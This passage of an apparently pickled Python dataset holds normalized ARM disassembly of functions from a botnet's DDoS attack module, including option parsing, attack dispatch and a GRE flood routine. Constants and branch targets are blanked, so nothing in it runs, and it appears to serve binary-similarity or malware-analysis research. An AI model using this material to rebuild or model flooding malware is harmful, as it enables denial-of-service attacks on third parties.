,[R12,0]\nMOV~R0,R5\nBL~FOO\nADD~R1,SP,0\nLDR~R4,[R1,0]\nCMP~R0,R4\nBGT~FOO\nLDRB~R3,[R5,R4]\nCMP~R3,0\nBNE~FOO\nMOV~R1,0\nADD~R2,SP,0\nSTR~R1,[R2,0]\nLDR~R3,[R6,0]\nCMP~R3,R1\nBLE~FOO\nMOV~R1,R1,LSL0\nADD~R1,R1,0\nMOV~R0,R5\nADD~R1,R9,R1\nMOV~R2,R4\nBL~FOO\nCMP~R0,0\nBNE~FOO\nADD~R12,SP,0\nLDR~R3,[R12,0]\nADD~R1,R3,0\nSTR~R1,[R12,0]\nLDR~R3,[R6,0]\nCMP~R3,R1\nBLE~FOO\nB~FOO\nLDR~R0,[R6,0]\nMOV~R0,R0,LSL0\nADD~R0,R0,0\nADD~R0,R9,R0\nMOV~R1,R5\nBL~FOO\nLDR~R3,[R6,0]\nADD~R3,R3,0\nSTR~R3,[R6,0]\nLDR~R0,[SP,0]\nADD~R0,R0,R10\nSTR~R0,[SP,0]\nLDR~R1,[SP,0]\nLDR~R2,[SP,0]\nADD~R4,R1,R2\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nMOV~R2,R0\nMOV~R0,R4\nLDR~R1,[SP,0]\nBL~FOO\nCMN~R0,0\nBEQ~FOO\nLDR~R3,[R6,0]\nCMP~R3,0\nBLE~FOO\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nMOV~R2,R0\nLDR~R5,[SP,0]\nADD~R3,SP,0\nADD~R3,R3,0\nADD~R4,R3,R5\nMOV~R0,R4\nLDR~R1,[SP,0]\nBL~FOO\nCMN~R0,0\nBEQ~FOO\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nMOV~R2,R0\nMOV~R0,R4\nLDR~R1,[SP,0]\nBL~FOO\nMOV~R4,R0\nADD~R12,SP,0\nADD~R12,R12,0\nADD~R3,R12,R0\nLDRB~R3,[R3,R5]\nCMP~R3,0\nADDEQ~R4,R0,0\nLDR~R0,[SP,0]\nADD~R5,R0,R4\nMOV~R0,R5\nLDR~R2,[SP,0]\nRSB~R1,R4,R2\nLDR~R2,<STR>\nMOV~R3,0\nBL~FOO\nCMN~R0,0\nBEQ~FOO\nCMP~R0,0\nSUBGT~R0,R0,0\nADD~R12,SP,0\nADD~R12,R12,0\nADD~R3,R12,R4\nLDR~R1,[SP,0]\nADD~R3,R3,R1\nMOV~R2,0\nSTRB~R2,[R3,R0]\nADD~R4,R0,0\nMOV~R0,R5\nMOV~R1,R4\nLDR~R2,<STR>\nMOV~R3,0\nBL~FOO\nCMP~R0,0\nBNE~FOO\nMOV~R3,0\nADD~R12,SP,0\nSTR~R3,[R12,0]\nLDRB~R3,[R5,0]\nCMP~R3,0\nSUBEQ~R3,R3,0\nSTREQ~R3,[R12,0]\nADD~R0,SP,0\nLDR~R2,[R0,0]\nMOV~R0,R5\nADD~R1,R5,R2\nRSB~R2,R2,R4\nBL~FOO\nMOV~R2,0\nADD~R1,SP,0\nSTR~R2,[R1,0]\nLDRB~R3,[R5]\nCMP~R3,R2\nBEQ~FOO\nCMP~R3,0\nMOVEQ~R1,R5\nBEQ~FOO\nB~FOO\nADD~R3,R3,0\nCMP~R2,0\nBNE~FOO\nMOV~R3,0\nSTRB~R3,[R1]\nB~FOO\nMOV~R3,0\nADD~R12,SP,0\nSTR~R3,[R12,0]\nADD~R1,R5,R3\nLDRB~R2,[R3,R5]\nCMP~R2,0\nBNE~FOO\nMOV~R0,R5\nBL~FOO\nCMP~R0,0\nBLE~FOO\nMOV~R0,R5\nBL~FOO\nCMP~R0,0\nBGT~FOO\nMOV~R0,0\nADD~R0,R9,R0\nMOV~R1,R5\nBL~FOO\nADD~R1,SP,0\nLDR~R0,[R1,0]\nADD~R0,R5,R0\nADD~R0,R0,0\nBL~FOO\nCMP~R0,0\nBGT~FOO\nMOV~R3,0\nADD~R4,R9,R3\nMOV~R0,R4\nMOV~R1,0\nBL~FOO\nADD~R2,SP,0\nLDR~R0,[R2,0]\nADD~R0,R5,R0\nADD~R0,R0,0\nBL~FOO\nCMP~R0,0\nBLE~FOO\nADD~R3,SP,0\nLDR~R1,[R3,0]\nADD~R1,R5,R1\nMOV~R0,R4\nADD~R1,R1,0\nBL~FOO\nB~FOO\nLDRB~R3,[R5]\nCMP~R3,0\nBNE~FOO\nMOV~R3,0\nADD~R4,R9,R3\nMOV~R0,R4\nMOV~R1,0\nBL~FOO\nADD~R12,SP,0\nLDR~R0,[R12,0]\nADD~R0,R5,R0\nADD~R0,R0,0\nBL~FOO\nCMP~R0,0\nBLE~FOO\nADD~R1,SP,0\nLDR~R0,[R1,0]\nADD~R0,R5,R0\nADD~R0,R0,0\nBL~FOO\nCMP~R0,0\nBGT~FOO\nADD~R2,SP,0\nLDR~R1,[R2,0]\nADD~R1,R5,R1\nMOV~R0,R4\nADD~R1,R1,0\nBL~FOO\nMOV~R3,0\nLDR~R12,[SP,0]\nSTRB~R3,[R12,-0]\nB~FOO\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nMOV~R2,R0\nLDR~R5,[SP,0]\nADD~R0,SP,0\nADD~R0,R0,0\nADD~R4,R0,R5\nMOV~R0,R4\nLDR~R1,[SP,0]\nBL~FOO\nCMN~R0,0\nBEQ~FOO\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nMOV~R2,R0\nMOV~R0,R4\nLDR~R1,[SP,0]\nBL~FOO\nMOV~R4,R0\nADD~R1,SP,0\nADD~R1,R1,0\nADD~R3,R1,R0\nLDRB~R3,[R3,R5]\nCMP~R3,0\nADDEQ~R4,R0,0\nLDR~R2,[SP,0]\nADD~R5,R2,R4\nMOV~R0,R5\nLDR~R3,[SP,0]\nRSB~R1,R4,R3\nLDR~R2,<STR>\nMOV~R3,0\nBL~FOO\nMOV~R7,R0\nCMN~R0,0\nBEQ~FOO\nCMP~R0,0\nSUBGT~R7,R0,0\nADD~R12,SP,0\nADD~R12,R12,0\nADD~R3,R12,R4\nLDR~R0,[SP,0]\nADD~R3,R3,R0\nMOV~R1,0\nSTRB~R1,[R3,R7]\nMOV~R3,0\nADD~R2,SP,0\nSTR~R3,[R2,0]\nLDRB~R1,[R5]\nSUB~R3,R1,0\nCMP~R3,0\nMOVHI~R3,R5\nBHI~FOO\nMOV~R2,0\nADD~R2,R2,0\nADD~R12,SP,0\nSTR~R2,[R12,0]\nLDRB~R1,[R2,R5]\nSUB~R3,R1,0\nCMP~R3,0\nBLS~FOO\nADD~R3,R5,R2\nCMP~R1,0\nBEQ~FOO\nMOV~R0,0\nSTRB~R0,[R3]\nADD~R1,SP,0\nLDR~R3,[R1,0]\nADD~R2,R3,0\nSTR~R2,[R1,0]\nLDRB~R3,[R5,R2]\nCMP~R3,0\nADDEQ~R3,R2,0\nSTREQ~R3,[R1,0]\nADD~R2,SP,0\nLDR~R4,[R2,0]\nADD~R4,R5,R4\nMOV~R0,R4\nBL~FOO\nMOV~R1,R0\nLDR~R6,<STR>\nMOV~R0,R4\nMOV~R2,R6\nBL~FOO\nCMN~R0,0\nBEQ~FOO\nADD~R3,SP,0\nLDR~R4,[R3,0]\nADD~R4,R5,R4\nMOV~R0,R4\nBL~FOO\nMOV~R1,R0\nMOV~R0,R4\nMOV~R2,R6\nBL~FOO\nADD~R12,SP,0\nLDR~R3,[R12,0]\nADD~R3,R3,R0\nSTR~R3,[R12,0]\nADD~R0,SP,0\nLDR~R4,[R0,0]\nLDRB~R3,[R5,R4]\nCMP~R3,0\nBNE~FOO\nADD~R4,R4,0\nSTR~R4,[R0,0]\nADD~R4,R5,R4\nMOV~R0,R4\nBL~FOO\nADD~R4,R4,R0\nLDRB~R3,[R4,-0]\nCMP~R3,0\nBNE~FOO\nADD~R1,SP,0\nLDR~R4,[R1,0]\nADD~R4,R5,R4\nMOV~R0,R4\nBL~FOO\nADD~R4,R4,R0\nMOV~R2,0\nSTRB~R2,[R4,-0]\nMOV~R0,R5\nMOV~R1,0\nBL~FOO\nSUB~R3,R0,0\nCMP~R3,0\nLDRLS~R3,[SP,0]\nADDLS~R4,R3,R0\nBLS~FOO\nB~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nCMP~R4,R0\nBHI~FOO\nADD~R12,SP,0\nLDR~R3,[R12,0]\nADD~R4,R5,R3\nMOV~R0,R4\nBL~FOO\nMOV~R1,R0\nMOV~R0,R4\nLDR~R2,<STR>\nBL~FOO\nCMP~R0,0\nBNE~FOO\nMOV~R3,0\nADD~R0,SP,0\nSTR~R3,[R0,0]\nLDRB~R3,[R4,0]\nCMP~R3,0\nSUBEQ~R3,R3,0\nSTREQ~R3,[R0,0]\nADD~R1,SP,0\nLDR~R3,[R1,0]\nADD~R2,R7,0\nMOV~R0,R4\nADD~R1,R4,R3\nRSB~R2,R3,R2\nBL~FOO\nMOV~R3,0\nADD~R2,SP,0\nSTR~R3,[R2,0]\nLDRB~R3,[R4]\nCMP~R3,0\nBEQ~FOO\nCMP~R3,0\nMOVEQ~R1,R4\nBEQ~FOO\nB~FOO\nADD~R3,R3,0\nCMP~R2,0\nBNE~FOO\nMOV~R12,0\nSTRB~R12,[R1]\nB~FOO\nMOV~R3,0\nADD~R0,SP,0\nSTR~R3,[R0,0]\nADD~R1,R3,R4\nLDRB~R2,[R3,R4]\nCMP~R2,0\nBNE~FOO\nMOV~R0,R4\nBL~FOO\nCMP~R0,0\nBLE~FOO\nMOV~R0,R4\nBL~FOO\nCMP~R0,0\nBGT~FOO\nMOV~R0,0\nADD~R0,R9,R0\nMOV~R1,R4\nBL~FOO\nADD~R1,SP,0\nLDR~R0,[R1,0]\nADD~R0,R4,R0\nADD~R0,R0,0\nBL~FOO\nCMP~R0,0\nBGT~FOO\nMOV~R3,0\nADD~R5,R9,R3\nMOV~R0,R5\nMOV~R1,0\nBL~FOO\nADD~R2,SP,0\nLDR~R0,[R2,0]\nADD~R0,R4,R0\nADD~R0,R0,0\nBL~FOO\nCMP~R0,0\nBLE~FOO\nADD~R3,SP,0\nLDR~R1,[R3,0]\nADD~R1,R4,R1\nMOV~R0,R5\nADD~R1,R1,0\nBL~FOO\nB~FOO\nLDRB~R3,[R4]\nCMP~R3,0\nBNE~FOO\nADD~R12,SP,0\nLDR~R0,[R12,0]\nADD~R0,R4,R0\nADD~R0,R0,0\nBL~FOO\nCMP~R0,0\nBGT~FOO\nMOV~R3,0\nADD~R5,R9,R3\nMOV~R0,R5\nMOV~R1,0\nBL~FOO\nADD~R1,SP,0\nLDR~R0,[R1,0]\nADD~R0,R4,R0\nADD~R0,R0,0\nBL~FOO\nCMP~R0,0\nBLE~FOO\nADD~R2,SP,0\nLDR~R1,[R2,0]\nADD~R1,R4,R1\nMOV~R0,R5\nADD~R1,R1,0\nBL~FOO\nMOV~R0,0\nADD~R0,R9,R0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R3,0\nLDR~R12,[SP,0]\nSTRB~R3,[R12,-0]\nB~FOO\nADD~R1,SP,0\nADD~R1,R1,0\nLDR~R2,[SP,0]\nADD~R0,R1,R2\nLDR~R1,[SP,0]\nLDR~R2,<STR>\nMOV~R3,0\nBL~FOO\nMOV~R5,R0\nMOV~R3,0\nADD~R4,R9,R3\nMOV~R0,R4\nLDR~R1,<STR>\nBL~FOO\nCMP~R0,0\nBNE~FOO\nMOV~R0,R4\nLDR~R1,<STR>\nBL~FOO\nCMP~R0,0\nBEQ~FOO\nMOV~R3,0\nLDR~R12,[SP,0]\nSTRB~R3,[R12,-0]\nB~FOO\nLDR~R0,[SP,0]\nCMP~R0,R5\nMOVGT~R3,0\nLDRGT~R1,[SP,0]\nSTRGTB~R3,[R1,-0]\nMOVLE~R3,0\nLDRLE~R2,[SP,0]\nSTRLEB~R3,[R2,-0]\nLDR~R0,[R6,-0]\nADD~R3,SP,0\nADD~R3,R3,0\nLDR~R12,[SP,0]\nADD~R1,R3,R12\nMOV~R2,R5\nMOV~R3,0\nBL~FOO\nB~FOO\nCMP~R3,0\nBNE~FOO\nB~FOO\nMOV~R3,0\nSTR~R3,[R4]\nB~FOO\nLDR~R0,[SP,0]\nLDRB~R3,[R0,-0]\nCMP~R3,0\nBNE~FOO\nLDR~R3,[R6,0]\nCMP~R3,0\nBNE~FOO\nMOV~R1,0\nADD~R1,R9,R1\nMOV~R0,R1\nADD~R1,R1,0\nMOV~R2,0\nBL~FOO\nLDR~R3,[R6,0]\nSUB~R3,R3,0\nSTR~R3,[R6,0]\nBL~FOO\nMOV~R4,R0\nMOV~R1,0\nSTR~R1,[R0]\nMOV~R3,0\nADD~R8,R9,R3\nLDR~R2,[R6,0]\nLDR~R0,[R6,-0]\nADD~R1,R8,R2\nRSB~R2,R2,0\nMOV~R3,0\nBL~FOO\nCMP~R0,0\nMOVEQ~R3,0\nSTREQ~R3,[R4]\nBEQ~FOO\nCMN~R0,0\nBNE~FOO\nLDR~R3,[R4]\nCMP~R3,0\nBEQ~FOO\nLDR~R0,[R6,-0]\nBL~FOO\nMOV~R3,0\nSTR~R3,[R6,-0]\nMOV~R3,0\nLDR~R2,[SP,0]\nSTRB~R3,[R2,-0]\nB~FOO\nLDR~R3,[R6,0]\nADD~R3,R3,R0\nSTR~R3,[R6,0]\nLDR~R12,[SP,0]\nSTR~R12,[R6,-0]\nMOV~R11,0\nADD~R0,R9,0\nSTR~R0,[SP,0]\nLDR~R3,[R6,0]\nCMP~R3,0\nBLE~FOO\nLDR~R5,[R6,0]\nCMP~R3,R5\nMOVLT~R4,R3\nMOVGE~R4,R5\nRSB~R3,R4,R3\nSTR~R3,[R6,0]\nLDR~R7,[R6,-0]\nCMP~R7,0\nBNE~FOO\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nMOV~R2,R0\nMOV~R0,R8\nMOV~R1,R5\nMOV~R3,0\nBL~FOO\nCMN~R0,0\nBEQ~FOO\nLDR~R4,[R6,0]\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nMOV~R2,R0\nMOV~R0,R8\nMOV~R1,R4\nMOV~R3,0\nBL~FOO\nMOV~R4,R0\nADD~R5,R8,R0\nLDR~R1,[R6,0]\nLDR~R11,<STR>\nMOV~R0,R5\nRSB~R1,R4,R1\nMOV~R2,R11\nMOV~R3,R7\nBL~FOO\nADD~R10,R4,R0\nMOV~R3,0\nSTR~R3,[SP,0]\nADD~R3,R10,R9\nMOV~R2,0\nLDR~R1,[SP,0]\nSTRB~R2,[R3,R1]\nLDR~R3,[R6,0]\nCMP~R3,0\nBGT~FOO\nMOV~R0,R5\nBL~FOO\nCMP~R0,0\nBGT~FOO\nLDR~R0,[R6,0]\nMOV~R0,R0,LSL0\nLDR~R3,[SP,0]\nADD~R0,R3,R0\nMOV~R1,R5\nBL~FOO\nLDR~R4,[R6,0]\nMOV~R4,R4,LSL0\nLDR~R12,[SP,0]\nADD~R4,R12,R4\nMOV~R0,R4\nBL~FOO\nADD~R0,R4,R0\nLDR~R1,<STR>\nBL~FOO\nADD~R4,R10,0\nADD~R5,R8,R4\nLDR~R1,[R6,0]\nMOV~R0,R5\nRSB~R1,R4,R1\nMOV~R2,R11\nMOV~R3,R7\nBL~FOO\nADD~R4,R4,R9\nADD~R4,R4,R0\nMOV~R1,0\nLDR~R0,[SP,0]\nSTRB~R1,[R4,R0]\nLDR~R4,[R6,0]\nMOV~R4,R4,LSL0\nLDR~R2,[SP,0]\nADD~R4,R2,R4\nMOV~R0,R4\nBL~FOO\nADD~R0,R4,R0\nMOV~R1,R5\nBL~FOO\nLDR~R3,[R6,0]\nADD~R3,R3,0\nSTR~R3,[R6,0]\nMOV~R3,0\nSTR~R3,[R6,0]\nADD~R3,R3,0\nLDR~R12,[SP,0]\nSTRB~R3,[R12,-0]\nB~FOO\nMOV~R4,0\nLDR~R5,[R6,0]\nCMP~R5,0\nBNE~FOO\nLDR~R7,[R6,0]\nCMP~R7,0\nBNE~FOO\nLDR~R10,<STR>\nMOV~R0,R8\nLDR~R1,[R6,0]\nMOV~R2,R10\nMOV~R3,0\nBL~FOO\nCMN~R0,0\nBEQ~FOO\nMOV~R0,R8\nLDR~R1,[R6,0]\nMOV~R2,R10\nMOV~R3,0\nBL~FOO\nMOV~R4,R0\nADD~R3,R0,R9\nSTRB~R5,[R3,0]\nLDR~R10,<STR>\nMOV~R0,R8\nMOV~R1,R4\nMOV~R2,R10\nMOV~R3,R7\nBL~FOO\nCMN~R0,0\nBEQ~FOO\nMOV~R0,R8\nMOV~R1,R4\nMOV~R2,R10\nMOV~R3,R7\nBL~FOO\nADD~R0,R0,R9\nSTRB~R5,[R0,0]\nMOV~R0,R8\nMOV~R1,0\nBL~FOO\nCMP~R0,0\nBEQ~FOO\nADD~R3,R0,0\nSTR~R3,[R6,0]\nB~FOO\nLDR~R3,[R6,0]\nRSB~R3,R4,R3\nSTR~R3,[R6,0]\nCMP~R3,0\nBEQ~FOO\nCMP~R4,0\nBEQ~FOO\nLDR~R2,[R6,0]\nRSB~R2,R4,R2\nSTR~R2,[R6,0]\nMOV~R0,R8\nADD~R1,R8,R4\nBL~FOO\nLDR~R1,[R6,0]\nADD~R2,R11,0\nADD~R3,R1,R9\nMOV~R0,0\nSTRB~R0,[R3,R2]\nCMP~R1,0\nBEQ~FOO\nB~FOO\nCMP~R3,0\nBNE~FOO\nBL~FOO\nMOV~R4,R0\nMOV~R5,0\nMOV~R1,0\nSTR~R1,[R4]\nLDR~R0,[R6,-0]\nADD~R2,SP,0\nADD~R2,R2,0\nADD~R1,R2,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nCMP~R0,0\nBEQ~FOO\nCMN~R0,0\nBNE~FOO\nLDR~R3,[R4]\nCMP~R3,0\nBEQ~FOO\nLDR~R0,[R6,-0]\nBL~FOO\nMOV~R3,0\nSTR~R3,[R6,-0]\nMOV~R12,0\nLDR~R3,[SP,0]\nSTRB~R12,[R3,-0]\nB~FOO\nMOV~R3,0\nLDR~R0,[SP,0]\nSTRB~R3,[R0,-0]\nB~FOO\nMOV~R3,0\nLDR~R1,[SP,0]\nSTRB~R3,[R1,-0]\nB~FOO\nLDR~R2,[SP,0]\nLDRB~R3,[R2,-0]\nCMP~R3,0\nMOVNE~R3,0\nSTRNEB~R3,[R2,-0]\nLDR~R3,[SP,0]\nADD~R3,R3,0\nSTR~R3,[SP,0]\nMOV~R3,0\nLDR~R12,[SP,0]\nADD~R12,R12,R3\nSTR~R12,[SP,0]\nLDR~R0,[SP,0]\nLDR~R1,[SP,0]\nCMP~R0,R1\nBEQ~FOO\nB~FOO\nMOV~R0,R5\nBL~FOO\nCMP~R0,0\nBGT~FOO\nB~FOO\nADD~SP,SP,0\nADD~SP,SP,0\nLDMFD~SP!,{R4-R11,PC}"'
p20
L8216L
tp21
a(S'attack_get_opt_str'
p22
S'"STMFD~SP!,{R4,LR}\nMOV~R4,R3\nAND~R0,R0,0\nAND~R2,R2,0\nCMP~R0,0\nBLE~FOO\nLDRB~R3,[R1,0]\nCMP~R3,R2\nADDNE~R12,R1,0\nMOVNE~LR,0\nBNE~FOO\nB~FOO\nMOV~R1,R12\nLDRB~R3,[R12,0]\nADD~R12,R12,0\nCMP~R3,R2\nBNE~FOO\nLDR~R4,[R1]\nB~FOO\nADD~LR,LR,0\nCMP~LR,R0\nBNE~FOO\nMOV~R0,R4\nLDMFD~SP!,{R4,PC}"'
p23
L96L
tp24
a(S'attack_get_opt_ip'
p25
S'"STMFD~SP!,{R4,LR}\nMOV~R4,R3\nAND~R0,R0,0\nAND~R2,R2,0\nMOV~R3,0\nBL~FOO\nCMP~R0,0\nBEQ~FOO\nBL~FOO\nMOV~R4,R0\nMOV~R0,R4\nLDMFD~SP!,{R4,PC}"'
p26
L48L
tp27
a(S'attack_get_opt_int'
p28
S'"STMFD~SP!,{R4,LR}\nMOV~R4,R3\nAND~R0,R0,0\nAND~R2,R2,0\nMOV~R3,0\nBL~FOO\nCMP~R0,0\nBEQ~FOO\nMOV~R1,0\nBL~FOO\nMOV~R4,R0\nMOV~R0,R4\nLDMFD~SP!,{R4,PC}"'
p29
L52L
tp30
a(S'attack_start'
p31
S'"STMFD~SP!,{R4-R8,R10,LR}\nMOV~R5,R0\nMOV~R10,R3\nAND~R6,R1,0\nAND~R7,R2,0\nLDRB~R8,[SP,0]\nBL~FOO\nCMN~R0,0\nMOVNE~R3,0\nMOVEQ~R3,0\nCMP~R0,0\nMOVLE~R4,R3\nORRGT~R4,R3,0\nCMP~R4,0\nLDMNEFD~SP!,{R4-R8,R10,PC}\nBL~FOO\nCMN~R0,0\nMOVEQ~R0,R4\nBLEQ~FOO\nCMP~R0,0\nBEQ~FOO\nLDR~R3,<STR>\nLDRB~R0,[R3]\nCMP~R0,0\nBLE~FOO\nLDR~R3,<STR>\nLDR~R1,[R3]\nLDR~R12,[R1]\nLDRB~R3,[R12,0]\nCMP~R3,R6\nMOVNE~R2,0\nBNE~FOO\nB~FOO\nMOV~R0,R5\nBL~FOO\nBL~FOO\nMOV~R1,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nLDR~R12,[R1,R2,LSL0]\nLDRB~R3,[R12,0]\nCMP~R3,R6\nBNE~FOO\nMOV~R0,R7\nMOV~R1,R10\nMOV~R2,R8\nLDR~R3,[SP,0]\nMOV~LR,PC\nLDR~PC,[R12]\nB~FOO\nADD~R2,R2,0\nCMP~R2,R0\nBNE~FOO\nMOV~R0,0\nBL~FOO"'
p32
L224L
tp33
a(S'attack_parse'
p34
S'"STMFD~SP!,{R4-R11,LR}\nSUB~SP,SP,0\nMOV~R5,R0\nMOV~R4,R1\nCMP~R1,0\nBLS~FOO\nLDR~R10,[R0]\nCMP~R1,0\nBEQ~FOO\nLDRB~R1,[R0,0]\nSTR~R1,[SP,0]\nCMP~R4,0\nBEQ~FOO\nLDRB~R0,[R0,0]\nCMP~R0,0\nBEQ~FOO\nSUB~R7,R4,0\nMOV~R6,R0\nMOV~R3,R0,LSL0\nADD~R8,R3,R0\nCMP~R7,R8\nBCC~FOO\nADD~R9,R5,0\nMOV~R1,0\nBL~FOO\nSTR~R0,[SP,0]\nSTR~R0,[SP,0]\nSUBS~R2,R6,0\nSTR~R2,[SP,0]\nBLE~FOO\nMOV~R12,R5\nMOV~R1,R0\nMOV~R7,0\nMOV~LR,0\nADD~R0,R8,R5\nLDR~R2,[R12,0]\nSTR~R2,[R1,0]\nLDRB~R3,[R12,0]\nSTRB~R3,[R1,0]\nSTRB~R7,[R1]\nSTRB~LR,[R1,0]\nSTR~R2,[R1,0]\nADD~R12,R12,0\nADD~R1,R1,0\nCMP~R0,R12\nBNE~FOO\nADD~R9,R12,0\nMOV~R3,R6,LSL0\nADD~R3,R3,R6\nRSB~R3,R3,R4\nSUB~R7,R3,0\nCMP~R7,0\nSTREQ~R7,[SP,0]\nBEQ~FOO\nLDRB~R3,[R9]\nSTR~R3,[SP,0]\nCMP~R3,0\nSTREQ~R3,[SP,0]\nBEQ~FOO\nLDR~R0,[SP,0]\nMOV~R1,0\nBL~FOO\nSTR~R0,[SP,0]\nLDR~R1,[SP,0]\nSTR~R1,[SP,0]\nCMP~R1,0\nBLE~FOO\nSUBS~R2,R7,0\nBEQ~FOO\nADD~R0,R9,0\nLDRB~R3,[R9,0]\nLDR~R1,[SP,0]\nSTRB~R3,[R1,0]\nSUBS~R3,R2,0\nBEQ~FOO\nADD~R1,R0,0\nLDRB~R8,[R0,0]\nSUB~R7,R3,0\nMOV~R4,R8\nCMP~R8,R7\nBGT~FOO\nADD~R6,R1,0\nLDR~R2,[SP,0]\nADD~R11,R2,0\nMOV~R5,R2\nMOV~R9,0\nB~FOO\nSUBS~R2,R7,R4\nBEQ~FOO\nADD~R0,R8,R6\nMOV~R5,R11\nLDRB~R3,[R8,R6]\nSTRB~R3,[R11,0]\nSUBS~R3,R2,0\nBEQ~FOO\nADD~R1,R0,0\nLDRB~R8,[R0,0]\nSUB~R7,R3,0\nMOV~R4,R8\nADD~R11,R11,0\nCMP~R7,R8\nBLT~FOO\nADD~R6,R1,0\nADD~R0,R4,0\nMOV~R1,0\nBL~FOO\nSTR~R0,[R5]\nMOV~R1,R6\nMOV~R2,R4\nBL~FOO\nADD~R9,R9,0\nLDR~R3,[SP,0]\nCMP~R3,R9\nBNE~FOO\nBL~FOO\nMOV~R3,0\nSTR~R3,[R0]\nAND~R3,R10,0\nMOV~R3,R3,LSR0\nORR~R3,R3,R10,LSR0\nAND~R2,R10,0\nMOV~R0,R10,LSL0\nORR~R0,R0,R2,LSL0\nLDR~R1,[SP,0]\nSTR~R1,[SP]\nLDR~R2,[SP,0]\nSTR~R2,[SP,0]\nORR~R0,R3,R0\nLDR~R1,[SP,0]\nLDR~R2,[SP,0]\nLDR~R3,[SP,0]\nBL~FOO\nLDR~R3,[SP,0]\nCMP~R3,0\nLDRNE~R0,[SP,0]\nBLNE~FOO\nLDR~R1,[SP,0]\nCMP~R1,0\nBEQ~FOO\nLDR~R5,[SP,0]\nCMP~R5,0\nBLE~FOO\nMOV~R4,0\nLDR~R2,[SP,0]\nLDR~R0,[R2,R4,LSL0]\nCMP~R0,0\nBLNE~FOO\nADD~R4,R4,0\nCMP~R5,R4\nBNE~FOO\nLDR~R0,[SP,0]\nBL~FOO\nADD~SP,SP,0\nLDMFD~SP!,{R4-R11,PC}"'
p35
L616L
tp36
a(S'attack_kill_all'
p37
S'"STMFD~SP!,{R4-R6,LR}\nLDR~R4,<STR>\nMOV~R6,0\nMOV~R5,R4\nLDR~R0,[R4]\nCMP~R0,0\nMOVNE~R1,0\nBLNE~FOO\nSTR~R6,[R5]\nADD~R4,R4,0\nLDR~R3,<STR>\nCMP~R4,R3\nBNE~FOO\nBL~FOO\nLDMFD~SP!,{R4-R6,PC}"'
p38
L60L
tp39
a(S'add_attack'
p40
S'"STMFD~SP!,{R4-R6,LR}\nMOV~R6,R1\nAND~R4,R0,0\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nMOV~R5,R0\nSTRB~R4,[R0,0]\nSTR~R6,[R0]\nLDR~R6,<STR>\nLDR~R4,<STR>\nLDRB~R1,[R4]\nMOV~R1,R1,LSL0\nLDR~R0,[R6]\nADD~R1,R1,0\nBL~FOO\nSTR~R0,[R6]\nLDRB~R3,[R4]\nSTR~R5,[R0,R3,LSL0]\nADD~R3,R3,0\nSTRB~R3,[R4]\nLDMFD~SP!,{R4-R6,PC}"'
p41
L88L
tp42
a(S'attack_init'
p43
S'"STR~LR,[SP,-0]\nMOV~R0,0\nLDR~R1,<STR>\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nBL~FOO\nMOV~R0,0\nLDR~PC,[SP]"'
p44
L132L
tp45
a(S'attack_gre_eth'
p46
S'"STMFD~SP!,{R4-R11,LR}\nSUB~SP,SP,0\nSTR~R1,[SP,0]\nMOV~R5,R3\nAND~R0,R0,0\nSTR~R0,[SP,0]\nAND~R4,R2,0\nMOV~R1,0\nBL~FOO\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nAND~R10,R0,0\nMOV~R6,0\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,R6\nBL~FOO\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nAND~R8,R0,0\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nAND~R7,R0,0\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,R6\nBL~FOO\nMOV~R11,R0\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,R6\nBL~FOO\nMOV~R9,R0\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,R2\nBL~FOO\nAND~R0,R0,0\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nMOV~R6,R0\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nLDR~R3,<STR>\nLDR~R3,[R3]\nBL~FOO\nMOV~R4,R0\nMOV~R0,0\nMOV~R1,0\nMOV~R2,0\nBL~FOO\nSTR~R0,[SP,0]\nCMN~R0,0\nBEQ~FOO\nADD~R3,SP,0\nMOV~R2,0\nSTR~R2,[R3,-0]\nADD~R2,R2,0\nSTR~R2,[SP]\nMOV~R1,0\nSUB~R2,R2,0\nBL~FOO\nCMN~R0,0\nBNE~FOO\nLDR~R0,[SP,0]\nBL~FOO\nB~FOO\nLDR~R0,[SP,0]\nSTR~R0,[SP,0]\nLDR~R1,[SP,0]\nMOV~R3,R1,LSL0\nMOV~R3,R3,LSR0\nSTR~R3,[SP,0]\nMOV~R3,R11,LSL0\nMOV~R3,R3,LSR0\nSTR~R3,[SP,0]\nMOV~R3,R9,LSL0\nMOV~R3,R3,LSR0\nSTR~R3,[SP,0]\nAND~R6,R6,0\nSTR~R6,[SP,0]\nSTR~R4,[SP,0]\nMOV~R3,0\nSTR~R3,[SP,0]\nLDR~R2,[SP,0]\